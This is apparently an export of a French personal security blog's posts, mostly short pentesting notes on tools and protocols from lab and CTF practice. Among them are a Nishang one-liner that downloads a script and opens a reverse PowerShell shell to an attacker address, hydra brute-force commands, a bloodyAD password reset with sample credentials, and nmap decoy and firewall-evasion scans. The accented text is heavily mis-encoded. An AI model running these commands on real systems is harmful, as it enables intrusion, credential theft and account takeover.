Cr√©er un groupe de ressources Un groupe de ressources est un conteneur logique dans lequel les ressources Azure sont d√©ploy√©es et g√©r√©es. Utilisez la commande¬†az group create¬†pour cr√©er un groupe de ressources nomm√©¬†myResourceGroup¬†√† l‚Äôemplacement¬†eastus. az group create --name \u0026#34;myResourceGroup\u0026#34; --location \u0026#34;EastUS\u0026#34; Cr√©er un coffre de cl√©s Utilisez la commande Azure CLI¬†az keyvault create¬†pour cr√©er un coffre de cl√©s dans le groupe de ressources de l‚Äô√©tape pr√©c√©dente. Vous devrez fournir certaines informations : Nom du coffre de cl√©s : cha√Æne de 3 √† 24¬†caract√®res qui ne peut contenir que des chiffres (0-9), des lettres (a-z, A-Z) et des traits d‚Äôunion (-).\nImportant\nChaque coffre de cl√©s doit avoir un nom unique. Remplacez par le nom de votre coffre de cl√©s dans les exemples suivants.\nGroupe de ressources nomm√©¬†:¬†myResourceGroup. Localisation¬†:¬†EastUS. az keyvault create --name \u0026#34;\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; --resource-group \u0026#34;myResourceGroup\u0026#34; Donner √† votre compte d‚Äôutilisateur des autorisations pour g√©rer les secrets dans Key Vault Pour obtenir des autorisations sur votre coffre de cl√©s par le biais du contr√¥le d‚Äôacc√®s en fonction du r√¥le (RBAC ), attribuez un r√¥le √† votre ¬´ nom d‚Äôutilisateur principal ¬ª (UPN) √† l‚Äôaide de la commande Azure CLI¬†az role assignment create. az role assignment create --role \u0026#34;Key Vault Secrets Officer\u0026#34; --assignee \u0026#34;\u0026lt;upn\u0026gt;\u0026#34; --scope \u0026#34;/subscriptions/\u0026lt;subscription-id\u0026gt;/resourceGroups/\u0026lt;resource-group-name\u0026gt;/providers/Microsoft.KeyVault/vaults/\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; Ajouter un secret au coffre de cl√©s Utilisez la commande Azure CLI¬†az keyvault secret set¬†suivante pour cr√©er une cl√© secr√®te dans Key Vault az keyvault secret set --vault-name \u0026#34;\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; --name \u0026#34;ExamplePassword\u0026#34; --value \u0026#34;hVFkk965BuUv\u0026#34; R√©cup√©rer un secret √† partir de Key Vault Vous pouvez maintenant r√©f√©rencer ce mot de passe que vous avez ajout√© √† Azure Key Vault √† l‚Äôaide de son URI. Utilisez¬†https://\u0026lt;your-unique-keyvault-name\u0026gt;.vault.azure.net/secrets/ExamplePassword¬†pour obtenir la version actuelle. Pour afficher la valeur contenue dans le secret sous forme de texte brut, utilisez la commande Azure¬†CLI¬†az keyvault secret show¬†:\naz keyvault secret show --name \u0026#34;ExamplePassword\u0026#34; --vault-name \u0026#34;\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; --query \u0026#34;value\u0026#34; Key Vault est con√ßu pour stocker des secrets de configuration pour des applications serveur.¬†Il n‚Äôest pas destin√© au stockage des donn√©es appartenant aux utilisateurs de votre application. Les donn√©es utilisateur doivent √™tre stock√©es ailleurs, par exemple, dans une base de donn√©es Azure SQL avec chiffrement transparent des donn√©es (Transparent data encryption), ou dans un compte de stockage avec chiffrement du service de stockage (Storage Service Encryption).\nRessources :\nhttps://learn.microsoft.com/fr-fr/cli/azure/keyvault?view=azure-cli-latest https://learn.microsoft.com/fr-fr/training/modules/manage-secrets-with-azure-key-vault/?source=recommendations https://learn.microsoft.com/fr-fr/azure/key-vault/general/security-features\n","permalink":"https://nyobemichel.me/posts/azure/key-vault/","summary":"key vault","title":"Key Vault"},{"content":"","permalink":"https://nyobemichel.me/posts/roadmap/aws---hacking/","summary":"key vault","title":"Key Vault"},{"content":"","permalink":"https://nyobemichel.me/posts/roadmap/web-hacking/","summary":"key vault","title":"Key Vault"},{"content":"Dans le monde des distributions Linux et windows, il existe de nombreuses fa√ßons de g√©rer les serveurs √† distance.\nSSH Secure Shell(¬†SSH) permet √† deux ordinateurs d\u0026rsquo;√©tablir une connexion chiffr√©e et directe au sein d\u0026rsquo;un r√©seau potentiellement non s√©curis√© sur le port standard¬†TCP 22. Il existe donc deux protocoles concurrents¬†:¬†SSH-1et¬†SSH-2. SSH-2, √©galement connu sous le nom de SSH version 2, est un protocole plus avanc√© que SSH version 1 en termes de chiffrement, de vitesse, de stabilit√© et de s√©curit√©. Par exemple,¬†SSH-1 il est vuln√©rable aux¬†MITMattaques, contrairement √† SSH-2.\nRsync Rsync est un outil rapide et efficace pour copier des fichiers localement et √† distance. Il permet de copier des fichiers localement sur une machine donn√©e et vers/depuis des h√¥tes distants.\nR-Services Les R-Services sont une suite de services h√©berg√©s pour permettre l\u0026rsquo;acc√®s √† distance ou l\u0026rsquo;ex√©cution de commandes entre h√¥tes Unix via TCP/IP. R-servicesS\u0026rsquo;√©tendant sur les ports¬†512,¬†513, et¬†514et , ils ne sont accessibles que via une suite de programmes appel√©e¬†r-commands. Ils sont le plus souvent utilis√©s par les syst√®mes d\u0026rsquo;exploitation commerciaux tels que Solaris, HP-UX et AIX. La suite¬†R-commands se compose des programmes suivants¬†:\nrcp (¬†remote copy) rexec (¬†remote execution) connexion r (¬†remote login) rsh (¬†remote shell) rstat temps de rupture rwho (¬†remote who) RDP Le¬†protocole RDP (Remote Desktop Protocol RDPest un protocole d√©velopp√© par Microsoft pour l\u0026rsquo;acc√®s √† distance √† un ordinateur ex√©cutant Windows. Ce protocole permet la transmission chiffr√©e de commandes d\u0026rsquo;affichage et de contr√¥le via l\u0026rsquo;interface utilisateur graphique (GUI) sur les r√©seaux IP.\nWinRM La gestion √† distance Windows (¬†WinRM) est un protocole simple de gestion √† distance int√©gr√© √† Windows, bas√© sur la ligne de commande. WinRM utilise le protocole Simple Object Access Protocol (¬†SOAP) pour √©tablir des connexions aux h√¥tes distants et √† leurs applications. Par cons√©quent, WinRM doit √™tre explicitement activ√© et configur√© √† partir de Windows 10. WinRM s\u0026rsquo;appuie sur¬†TCPles ports¬†5985et¬†5986pour communiquer.\nWMI Windows Management Instrumentation (¬†WMI) est l\u0026rsquo;impl√©mentation de Microsoft et une extension du mod√®le commun d\u0026rsquo;information (¬†CIM), fonctionnalit√© essentielle de la gestion d\u0026rsquo;entreprise Web standardis√©e (¬†WBEM) pour la plateforme Windows.\nhttps://www.golinuxcloud.com/openssh-authentication-methods-sshd-config/ https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html\n","permalink":"https://nyobemichel.me/posts/learn/protocoles-de-gestion-%C3%A0-distance/","summary":"Protocoles de gestion √† distance Linux","title":"Protocoles de gestion √† distance"},{"content":"Par d√©faut, les ports¬†110et¬†995sont utilis√©s pour POP3, et les ports¬†143et¬†993sont utilis√©s pour IMAP. Les ports sup√©rieurs (¬†993et¬†995) utilisent TLS/SSL pour chiffrer les communications entre le client et le serveur. Gr√¢ce √† Nmap, nous pouvons analyser le serveur √† la recherche de ces ports\nPour interagir avec le serveur IMAP ou POP3 via SSL, nous pouvons utiliser¬†openssl, ainsi que¬†ncat. Les commandes correspondantes sont les suivantes¬†:\nopenssl s_client -connect 10.129.14.128:pop3s nmap -p 143,993 --script imap-ntlm-info 10.0.0.3 msf6 auxiliary(scanner/pop3/pop3_version) Commandes IMAP 1 LOGIN username password Connexion de l\u0026rsquo;utilisateur. 1 LIST \u0026quot;\u0026quot; * R√©pertorie tous les r√©pertoires. 1 CREATE \u0026quot;INBOX\u0026quot; Cr√©e une bo√Æte aux lettres avec un nom sp√©cifi√©. 1 DELETE \u0026quot;INBOX\u0026quot; Supprime une bo√Æte aux lettres. 1 RENAME \u0026quot;ToRead\u0026quot; \u0026quot;Important\u0026quot; Renomme une bo√Æte aux lettres. 1 LSUB \u0026quot;\u0026quot; * Renvoie un sous-ensemble de noms de l\u0026rsquo;ensemble de noms que l\u0026rsquo;utilisateur a d√©clar√© comme √©tant¬†activeou¬†subscribed. 1 SELECT INBOX S√©lectionne une bo√Æte aux lettres afin que les messages qu\u0026rsquo;elle contient soient accessibles. 1 UNSELECT INBOX Quitte la bo√Æte aux lettres s√©lectionn√©e. 1 FETCH \u0026lt;ID\u0026gt; all R√©cup√®re les donn√©es associ√©es √† un message dans la bo√Æte aux lettres. 1 CLOSESupprime tous les messages avec l\u0026rsquo;¬†Deletedindicateur d√©fini 1 LOGOUTFerme la connexion avec le serveur IMAP.\nCommandes POP3 USER username Identifie l\u0026rsquo;utilisateur. PASS password Authentification de l\u0026rsquo;utilisateur √† l\u0026rsquo;aide de son mot de passe. STAT Demande le nombre d\u0026rsquo;e-mails enregistr√©s aupr√®s du serveur. LIST Demande au serveur le nombre et la taille de tous les e-mails. RETR id Demande au serveur de livrer l\u0026rsquo;e-mail demand√© par ID. DELE id Demande au serveur de supprimer l\u0026rsquo;e-mail demand√© par ID. CAPADemande au serveur d\u0026rsquo;afficher les capacit√©s du serveur. RSETDemande au serveur de r√©initialiser les informations transmises. QUIT Ferme la connexion avec le serveur POP3.\nhttps://donsutherland.org/crib/imap https://www.atmail.com/blog/imap-101-manual-imap-sessions/\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration-imap----pop3/","summary":"IMAP/POP3","title":"Enumeration IMAP - POP3"},{"content":"Bienvenue dans cet annuaire complet de ressources en cybers√©curit√©, cloud, DevOps, administration syst√®me, r√©seau, conteneurisation (Docker/Kubernetes), Red Team et Blue Team. Que vous soyez √©tudiant, professionnel en reconversion, passionn√© autodidacte ou ing√©nieur confirm√©, ce guide regroupe des liens vers des plateformes gratuites et payantes pour apprendre, pratiquer, exp√©rimenter et se certifier dans les domaines cl√©s de la s√©curit√© informatique et de l\u0026rsquo;administration des syst√®mes modernes.\nLa cybers√©curit√© est un domaine en constante √©volution. Il ne suffit plus d‚Äôapprendre en th√©orie : il faut pratiquer sur des environnements r√©alistes, se mesurer √† des d√©fis techniques, et d√©couvrir les bonnes pratiques du monde r√©el. C‚Äôest dans cette optique que cet annuaire a √©t√© con√ßu : rassembler les meilleurs Labs interactifs, plateformes d\u0026rsquo;entra√Ænement et simulateurs cloud accessibles sur Internet, tout en vous √©vitant de perdre du temps √† chercher.\nHack The Box (HTB) Hack The Box Academy TryHackMe PentesterLab PortSwigger Web Security Academy Cyber Learning Red Labs - Altered Security Root Me VulnHub VulnMachines OWASP Juice Shop Damn Vulnerable Web App (DVWA) HackSplaining HackThisSite HackerTest SEED Security Labs pwnable.kr ZenK-Security Hacker101 CTF White-box pentesting (GitHub) Damn Vulnerable GraphQL App (GitHub) Generic University (GitHub) API Sandbox (GitHub) OWASP Docker Compose Top 10 OWASP Top 10 Labs Blue Team Labs Online RangeForce LetsDefend Security Blue Team Cyber Defenders Splunk Security Essentials Microsoft Applied Skills AWS Skill Builder Google Cloud Skills Boost CloudGoat - AWS (GitHub) AzureGoat (GitHub) AWSGoat (GitHub) TerraGoat (GitHub) Flaws.cloud Flaws2.cloud BigIAM Challenge Serverless CTF (SANS CloudWars) BadZure (GitHub) BustaKube SadServers KodeKloud Labs Gratuits LabEx Iximiuz Labs Play with Docker Linux Survival Bandit Wargame Kubernetes Goat Kubernetes Goat (GitHub) CI/CD Goat (GitHub) Atomic Red Team (GitHub) SQL Murder Mystery SQL Squid Game VIM Adventures Pwn College Pwn Tunisia 247CTF Crypto Challenge ‚Äì Mystery Twister VulnLab Immersive Labs Red Team Attack Lab (GitHub) ADSecurity Harmj0y\u0026rsquo;s Blog GOAD (GitHub) lab redteamleaders thehacker.recipes Cloud Security Labs Training cybersecurity classes on a variety of topics API Academy Hackerone CryptoHack Pentester Lab ","permalink":"https://nyobemichel.me/posts/learn/les-liens-essentiels/","summary":"annuaire complet de ressources en cybers√©curit√©","title":"Les Liens Essentiels"},{"content":"","permalink":"https://nyobemichel.me/posts/enumeration/enumeration-ad---interne/","summary":"SMTP","title":"Enumeration AD - Interne"},{"content":"Introduction √† PowerShell PowerShell est √† la fois un langage de script puissant et un environnement en ligne de commande pour les syst√®mes Windows. Il est construit sur le framework .NET, ce qui lui permet de manipuler des objets complexes directement en ligne de commande.\nCommandes PowerShell de base Utilisation de Get-Help La commande Get-Help affiche des informations sur une cmdlet (commande PowerShell). Pour obtenir de l‚Äôaide sur une commande sp√©cifique :\nGet-Help Nom-De-La-Commande Pour voir des exemples d\u0026rsquo;utilisation concrets :\nGet-Help Nom-De-La-Commande -Examples Utilisation de Get-Command Get-Command permet de lister toutes les cmdlets disponibles sur le syst√®me. Elle supporte √©galement les filtres par motif :\nGet-Command Verb-* Get-Command *-Noun Par exemple :\nGet-Command New-* affichera toutes les cmdlets commen√ßant par le verbe New.\nLe pipeline (|) Le pipeline (|) permet de transmettre la sortie d‚Äôune commande comme entr√©e √† une autre. Contrairement aux autres shells (comme Bash), PowerShell passe des objets, et non du texte.\nExemple :\nGet-Command | Get-Member -MemberType Method Cela permet d‚Äôexaminer les m√©thodes disponibles sur les objets retourn√©s par Get-Command.\nCr√©ation d‚Äôobjets avec Select-Object Pour manipuler les r√©sultats d‚Äôune commande et ne conserver que certaines propri√©t√©s :\nGet-ChildItem | Select-Object -Property Mode, Name Filtrage des objets avec Where-Object Pour filtrer les objets selon des crit√®res pr√©cis :\nGet-Process | Where-Object -Property CPU -GT 100 Ou en notation script block :\nGet-Process | Where-Object { $_.CPU -gt 100 } Op√©rateurs courants : -Contains : contient exactement la valeur\n-EQ : √©gal\n-GT : sup√©rieur\nTrier les objets avec Sort-Object Pour trier la sortie d‚Äôune commande :\nGet-Process | Sort-Object CPU Quelques commandes utiles Rechercher un fichier dans un dossier Get-ChildItem -Path \u0026#34;C:\\Users\\Michel\\Documents\u0026#34; -Recurse -Filter \u0026#34;rapport.docx\u0026#34; Obtenir le r√©pertoire de travail actuel Get-Location Faire une requ√™te HTTP Invoke-WebRequest -Uri \u0026#34;https://example.com\u0026#34; √ânum√©ration syst√®me Nombre d‚Äôutilisateurs locaux Get-LocalUser Informations d√©taill√©es sur tous les comptes utilisateur Get-WmiObject -Class Win32_UserAccount Obtenir l‚Äôadresse IP locale Get-NetIPAddress Voir les ports √† l‚Äô√©coute Get-NetTCPConnection | Where-Object { $_.State -eq \u0026#34;Listen\u0026#34; } Lister tous les processus en cours Get-Process Lister toutes les t√¢ches planifi√©es Get-ScheduledTask Obtenir la liste de contr√¥le d‚Äôacc√®s (ACL) Get-Acl -Path \u0026#34;C:\\chemin\\du\\dossier-ou-fichier\u0026#34; Pour aller plus loin https://learnxinyminutes.com/powershell/\nhttps://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object\n","permalink":"https://nyobemichel.me/posts/articles/powershell/","summary":"PowerShell","title":"PowerShell"},{"content":"La reconnaissance est une √©tape cl√© dans toute campagne de Red Team ou d‚Äôaudit de s√©curit√© Active Directory. BloodHound est un outil puissant permettant de visualiser et d‚Äôanalyser les relations d‚Äôun domaine Active Directory en utilisant la th√©orie des graphes.\nBloodHound : Pr√©sentation BloodHound est une application qui cartographie les relations entre les objets Active Directory (utilisateurs, groupes, ordinateurs, sessions, d√©l√©gations, ACL, etc.) pour identifier des chemins d‚Äôattaque possibles, tels que les escalades de privil√®ges ou les mouvements lat√©raux.\nIl repose sur une base de donn√©es orient√©e graphe, Neo4j, et une interface graphique puissante qui permet d\u0026rsquo;ex√©cuter des requ√™tes en langage Cypher pour analyser les chemins d\u0026rsquo;attaque.\nCollecte de donn√©es avec bloodhound-python L‚Äôoutil classique SharpHound peut √™tre remplac√© par bloodhound-python, une alternative sans agent √©crite en Python. Cela permet une collecte depuis une machine Linux ou directement via un shell Python dans certains cas de compromission.\nExemple de commande compl√®te : sudo bloodhound-python -d \u0026lt;domain\u0026gt; -u \u0026lt;username\u0026gt;@\u0026lt;domain\u0026gt; -p \u0026lt;password\u0026gt; -c all -ns \u0026lt;domain_controller_ip\u0026gt; -v sudo bloodhound-python -d \u0026lt;domain\u0026gt; -c all --kerberos -ns \u0026lt;domaine_controller_ip\u0026gt; -v Une fois la collecte termin√©e, vous obtiendrez un ou plusieurs fichiers .json.gz √† importer dans l‚Äôinterface BloodHound.\nneo4j console http://localhost:7474/ Bloodhound\nhttps://bloodhound.readthedocs.io/en/latest/index.html https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/\n","permalink":"https://nyobemichel.me/posts/outils/bloodhound/","summary":"Bloodhound","title":"Bloodhound"},{"content":"est un couteau suisse d\u0026rsquo;escalade des privil√®ges Active Directory ./bloodyAD.py \u0026ndash;host \u0026ldquo;10.10.11.42\u0026rdquo; -d \u0026ldquo;Administrator.htb\u0026rdquo; -u \u0026ldquo;olivia\u0026rdquo; -p \u0026ldquo;ichliebedich\u0026rdquo; set password \u0026ldquo;michael\u0026rdquo; \u0026ldquo;Password@123\u0026rdquo; https://github.com/CravateRouge/bloodyAD\n","permalink":"https://nyobemichel.me/posts/outils/bloodyad/","summary":"BloodyAD","title":"BloodyAD"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/chisel/","summary":"chisel","title":"chisel"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/crackmapexec/","summary":"Crackmapexec","title":"Crackmapexec"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/curl/","summary":"Curl","title":"curl"},{"content":"Ce shell est le shell WinRM ultime pour le piratage/pentesting.\nWinRM (Windows Remote Management) est l\u0026rsquo;impl√©mentation Microsoft du protocole WS-Management. Un protocole standard bas√© sur SOAP qui permet l\u0026rsquo;interop√©rabilit√© du mat√©riel et des syst√®mes d\u0026rsquo;exploitation de diff√©rents fournisseurs. Microsoft l\u0026rsquo;a inclus dans ses syst√®mes d\u0026rsquo;exploitation afin de faciliter la vie des administrateurs syst√®me.\nCe programme peut √™tre utilis√© sur n\u0026rsquo;importe quel serveur Microsoft Windows avec cette fonctionnalit√© activ√©e (g√©n√©ralement sur le port 5985), bien s√ªr uniquement si vous disposez des informations d\u0026rsquo;identification et des autorisations pour l\u0026rsquo;utiliser. Nous pouvons donc dire qu\u0026rsquo;il pourrait √™tre utilis√© dans une phase de piratage/pentesting post-exploitation. Le but de ce programme est de fournir des fonctionnalit√©s agr√©ables et faciles √† utiliser pour le piratage. Il peut √©galement √™tre utilis√© √† des fins l√©gitimes par les administrateurs syst√®me, mais la plupart de ses fonctionnalit√©s sont ax√©es sur le piratage/pentesting.\nIl est principalement bas√© sur la biblioth√®que WinRM Ruby qui a chang√© sa fa√ßon de fonctionner depuis sa version 2.0. D√©sormais, au lieu d\u0026rsquo;utiliser le protocole WinRM, il utilise PSRP (Powershell Remoting Protocol) pour initialiser les pools d\u0026rsquo;espaces d\u0026rsquo;ex√©cution ainsi que pour cr√©er et traiter les pipelines.\nevil-winrm -i MonIP -u emily.oscars -p 'Passw'\nhttps://github.com/Hackplayers/evil-winrm\n","permalink":"https://nyobemichel.me/posts/outils/evil-winrm/","summary":"Evil-WinRM","title":"Evil-WinRM"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/ffuf/","summary":"ffuf","title":"ffuf"},{"content":"Peut √™tre utilis√© pour r√©cup√©rer les utilisateurs du domaine qui ont d√©fini ¬´ Ne pas exiger de pr√©-authentification Kerberos ¬ª et demander leurs TGT sans conna√Ætre leurs mots de passe. Il est alors possible de tenter de d√©chiffrer la cl√© de session envoy√©e avec le ticket pour r√©cup√©rer le mot de passe de l\u0026rsquo;utilisateur.\nour v√©rifier si l\u0026rsquo;un de ces noms d\u0026rsquo;utilisateur est valide, nous utiliserons le script GetNPUsers.py.\n./GetNPUsers.py Domain_name/ -usersfile Usernames.txt -dc-ip 10.129.28.119 https://tools.thehacker.recipes/impacket/examples/getnpusers.py#commons\n","permalink":"https://nyobemichel.me/posts/outils/getnpusers.py/","summary":"GetNPUsers.py","title":"GetNPUsers.py"},{"content":"Gobuster est un outil polyvalent couramment utilis√© pour le for√ßage de r√©pertoires et de fichiers, mais il excelle √©galement dans la d√©couverte d\u0026rsquo;h√¥tes virtuels. Il envoie syst√©matiquement des requ√™tes HTTP avec diff√©rents¬†Hosten-t√™tes √† une adresse IP cible, puis analyse les r√©ponses pour identifier les h√¥tes virtuels valides.\nIl y a quelques √©l√©ments que vous devez pr√©parer pour forcer¬†Hostles en-t√™tes¬†:\nTarget IdentificationTout d\u0026rsquo;abord, identifiez l\u0026rsquo;adresse IP du serveur web cible. Cela peut √™tre r√©alis√© par des recherches DNS ou d\u0026rsquo;autres techniques de reconnaissance. Wordlist PreparationPr√©parez une liste de mots contenant des noms d\u0026rsquo;h√¥tes virtuels potentiels. Vous pouvez utiliser une liste de mots pr√©compil√©e, telle que SecLists, ou en cr√©er une personnalis√©e en fonction du secteur d\u0026rsquo;activit√© de votre cible, des conventions de nommage ou d\u0026rsquo;autres informations pertinentes. gobuster dir -u http://10.10.11.72 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 gobuster vhost -u http://\u0026lt;target_IP_address\u0026gt; -w \u0026lt;wordlist_file\u0026gt; --append-domain ","permalink":"https://nyobemichel.me/posts/outils/gobuster/","summary":"Gobuster","title":"Gobuster"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/guacamole/","summary":"Guacamole","title":"Guacamole"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/hascat/","summary":"hascat","title":"hascat"},{"content":"hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v Pages de connexion¬†HTTP\nhydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form \u0026#34;/login-get/index.php:username=^USER^\u0026amp;password=^PASS^:S=logout.php\u0026#34; -f SMTP\nhydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v https://github.com/digininja/CeWL ( generer une liste de mot passe )\n","permalink":"https://nyobemichel.me/posts/outils/hydra/","summary":"Hydra","title":"Hydra"},{"content":"Kerbrute est un outil d\u0026rsquo;√©num√©ration populaire utilis√© pour forcer et √©num√©rer les utilisateurs Active Directory valides en abusant de la¬†pr√©-authentification¬†Kerberos . https://github.com/ropnop/kerbrute/releases Rendre Kerbrute executable Enumeration des utilisateurs L\u0026rsquo;√©num√©ration des utilisateurs vous permet de savoir quels comptes d\u0026rsquo;utilisateurs se trouvent sur le domaine cible et quels comptes pourraient potentiellement √™tre utilis√©s pour acc√©der au r√©seau.\n./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt ","permalink":"https://nyobemichel.me/posts/outils/kerbrute/","summary":"kerbrute","title":"kerbrute"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/linpeas/","summary":"linPeas","title":"linPeas"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/netexec/","summary":"NetExec","title":"NetExec"},{"content":"Nishang est un framework et un ensemble de scripts et de charges utiles permettant d\u0026rsquo;utiliser PowerShell pour la s√©curit√© offensive, les tests d\u0026rsquo;intrusion et le red teaming. Nishang est utile √† toutes les phases des tests d\u0026rsquo;intrusion.\npowershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://\u0026lt;yourwebserver\u0026gt;/Invoke-PowerShellTcp.ps1\u0026#39;);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] https://github.com/samratashok/nishang\n","permalink":"https://nyobemichel.me/posts/outils/nishang/","summary":"Nishang","title":"Nishang"},{"content":"nmap -sV -sC $IP -v -p- --min-rate 1000 -Pn -T4\nII existe au total 6 √©tats diff√©rents pour un port scann√© que nous pouvons obtenir¬†: Open Closed Filtered unfiltered open | filtered Closed | filtered -Pn D√©sactive les requ√™tes ICMP Echo. \u0026lsquo; nmap 10.129.2.0/24 -F | grep \u0026quot;/tcp\u0026quot; | wc -l\u0026rsquo;\nLeurres Il existe des cas dans lesquels les administrateurs bloquent en principe des sous-r√©seaux sp√©cifiques de diff√©rentes r√©gions. Cela emp√™che tout acc√®s au r√©seau cible. Un autre exemple est lorsque IPS doit nous bloquer. Pour cette raison, la m√©thode de balayage Decoy (¬†-D) est le bon choix. Avec cette m√©thode, Nmap g√©n√®re diverses adresses IP al√©atoires ins√©r√©es dans l\u0026rsquo;en-t√™te IP pour masquer l\u0026rsquo;origine du paquet envoy√©. Avec cette m√©thode, nous pouvons g√©n√©rer al√©atoirement (¬†RND) un nombre sp√©cifique (par exemple :¬†5) d\u0026rsquo;adresses IP s√©par√©es par deux points (¬†:). Notre v√©ritable adresse IP est ensuite plac√©e al√©atoirement entre les adresses IP g√©n√©r√©es. Dans l\u0026rsquo;exemple suivant, notre v√©ritable adresse IP est donc plac√©e en deuxi√®me position. Un autre point critique est que les leurres doivent √™tre vivants. Sinon, le service sur la cible peut √™tre inaccessible en raison des m√©canismes de s√©curit√© SYN-flooding.\nnmap $ip -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 -p 80 Analyse uniquement les ports sp√©cifi√©s. -sS Ex√©cute une analyse SYN sur les ports sp√©cifi√©s. -Pn D√©sactive les requ√™tes ICMP Echo. -n D√©sactive la r√©solution DNS. --disable-arp-ping D√©sactive le ping ARP. --packet-trace Affiche tous les paquets envoy√©s et re√ßus. -D RND:5 G√©n√®re cinq adresses IP al√©atoires qui indiquent l\u0026rsquo;IP source d\u0026rsquo;o√π provient la connexion. `nmap 10.129.96.164 -n -Pn -p 80 -O -S 10.10.15.130 -e tun0 -sV` Proxy DNS Par d√©faut,¬†Nmapeffectue une r√©solution DNS inverse, sauf indication contraire, pour trouver des informations plus importantes sur notre cible. Ces requ√™tes DNS sont √©galement transmises dans la plupart des cas, car le serveur Web donn√© est cens√© √™tre trouv√© et visit√©. Les requ√™tes DNS sont effectu√©es via le¬†UDP port 53. Le¬†TCP port 53√©tait auparavant utilis√© uniquement pour les \u0026quot;¬†Zone transfers\u0026quot; entre les serveurs DNS ou le transfert de donn√©es sup√©rieur √† 512 octets. De plus en plus, cela change en raison des extensions IPv6 et DNSSEC. Ces changements entra√Ænent de nombreuses requ√™tes DNS via le port TCP 53.\nCependant, cela¬†Nmapnous donne toujours un moyen de sp√©cifier nous-m√™mes les serveurs DNS (¬†--dns-server \u0026lt;ns\u0026gt;,\u0026lt;ns\u0026gt;). Cette m√©thode pourrait nous √™tre fondamentale si nous nous trouvons dans une zone d√©militaris√©e (¬†DMZ). Les serveurs DNS de l\u0026rsquo;entreprise sont g√©n√©ralement plus fiables que ceux d\u0026rsquo;Internet. Ainsi, par exemple, nous pourrions les utiliser pour interagir avec les h√¥tes du r√©seau interne. Comme autre exemple, nous pouvons utiliser¬†TCP port 53comme port source (¬†--source-port) pour nos analyses. Si l\u0026rsquo;administrateur utilise le pare-feu pour contr√¥ler ce port et ne filtre pas correctement les IDS/IPS, nos paquets TCP seront approuv√©s et transmis.\nnmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 ncat -nv --source-port 53 10.129.150.182 50000 ","permalink":"https://nyobemichel.me/posts/outils/nmap/","summary":"Nmap","title":"Nmap"},{"content":"","permalink":"https://nyobemichel.me/posts/outils/powerups/","summary":"PowerUps","title":"PowerUps"},{"content":"Get-DomainGPOLocalGroup Renvoie tous les objets de strat√©gie de groupe d\u0026rsquo;un domaine qui modifient les appartenances aux groupes locaux via les pr√©f√©rences ¬´¬†Groupes restreints¬†¬ª ou Strat√©gie de groupe. Renvoie √©galement leurs mappages d\u0026rsquo;appartenance d\u0026rsquo;utilisateur, s\u0026rsquo;ils existent.\nGet-DomainObjectAcl Renvoie les ACL associ√©es √† un objet Active Directory sp√©cifique. debut de l\u0026rsquo;attaque [[Abusing Active Directory ACLs]]\nGet-DomainObjectAcl -Identity \u0026#34;Domain Admins\u0026#34; -ResolveGUIDs - Verbose PowerView\nLe Domaine Courant Get-Netdomain Obtenir le SID du domain actuel Get-DomainSID Obtenir les COntrolleur de domaine Get-NetDomainController Obtenir la liste des utilisateurs du Domaine Get-NetUser Recherche les machines sur le domaine local o√π l\u0026rsquo;utilisateur actuel dispose d\u0026rsquo;un acc√®s administrateur local. Find-LocalAdminAccess ","permalink":"https://nyobemichel.me/posts/outils/poweview/","summary":"Poweview","title":"Poweview"},{"content":"Il achemine tout le trafic provenant de n\u0026rsquo;importe quel outil de ligne de commande vers n\u0026rsquo;importe quel proxy que nous sp√©cifions. il ajoute un proxy √† n\u0026rsquo;importe quel outil de ligne de commande et constitue donc la m√©thode la plus simple pour acheminer le trafic Web des outils de ligne de commande via nos proxys Web. Pour utiliser¬†proxychains, nous devons d\u0026rsquo;abord √©diter¬†/etc/proxychains.conf, commenter la derni√®re ligne et ajouter la ligne suivante √† la fin de celle-ci :\n#socks4 127.0.0.1 9050 http 127.0.0.1 8080 Nous devrions √©galement activer¬†Quiet Mode pour la r√©duction du bruit en d√©commettant¬†quiet_mode. Une fois cela fait, nous pouvons ajouter¬†proxychains a n\u0026rsquo;importe quelle commande au d√©but, et le trafic de cette commande sera achemin√© via¬†proxychains pour notre proxy web. Par exemple, essayons d\u0026rsquo;utiliser¬†cURLl\u0026rsquo;un de nos exercices pr√©c√©dents¬†:\nproxychains curl http://SERVER_IP:PORT ProxyChains-3.1 (http://proxychains.sf.net) \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Ping IP\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;./style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; ...SNIP... \u0026lt;/html\u0026gt; https://github.com/haad/proxychains\n","permalink":"https://nyobemichel.me/posts/outils/proxychains/","summary":"proxychains","title":"Proxychains"},{"content":"Psexec est depuis des ann√©es la m√©thode de r√©f√©rence pour ex√©cuter des processus √† distance. Il permet √† un administrateur d\u0026rsquo;ex√©cuter des commandes √† distance sur n\u0026rsquo;importe quel PC auquel il a 